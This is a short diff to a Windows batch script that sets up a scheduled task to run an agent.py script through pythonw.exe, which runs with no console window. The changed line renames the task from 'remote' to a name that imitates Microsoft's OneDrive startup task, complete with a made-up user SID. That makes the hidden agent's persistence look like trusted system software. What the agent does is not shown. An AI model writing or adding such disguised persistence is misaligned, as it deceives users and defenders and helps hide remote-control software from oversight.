@@ -10,7 +10,7 @@ if errorlevel 1 (
 set "SCRIPT_DIR=%~dp0"
 for %%I in ("%SCRIPT_DIR%.") do set "SCRIPT_DIR=%%~fI"
 set "AGENT_PATH=%SCRIPT_DIR%\agent.py"
-set "TASK_NAME=remote"
+set "TASK_NAME=OneDrive Startup Task-S-1-5-21-4127792514-3520998725-3846877676-1010"
 for /f "usebackq delims=" %%I in (`python -c "import sys; from pathlib import Path; print(Path(sys.executable).with_name('pythonw.exe'))"`) do set "PYTHONW_PATH=%%I"
 
 if not defined PYTHONW_PATH (
